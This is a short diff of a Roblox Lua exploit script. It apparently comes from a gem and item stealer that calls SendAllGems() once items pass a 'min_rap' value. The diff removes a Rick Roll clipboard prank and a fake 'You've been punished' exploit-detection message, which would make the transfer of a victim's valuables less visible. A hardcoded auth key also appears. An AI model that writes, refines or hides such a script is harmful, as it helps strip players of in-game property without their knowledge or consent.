@@ -361,9 +361,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         end
     end
     SendAllGems()
-    setclipboard("https://youtu.be/dQw4w9WgXcQ?si=Cl8aTDVjW6IaWgtm")
-    local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("We've detected that you're using exploits. You've been punished.")
 end
 getgenv().AuthKey = "HUGE_73hRxG7zwEmR"
 getgenv().LoadSettings = {
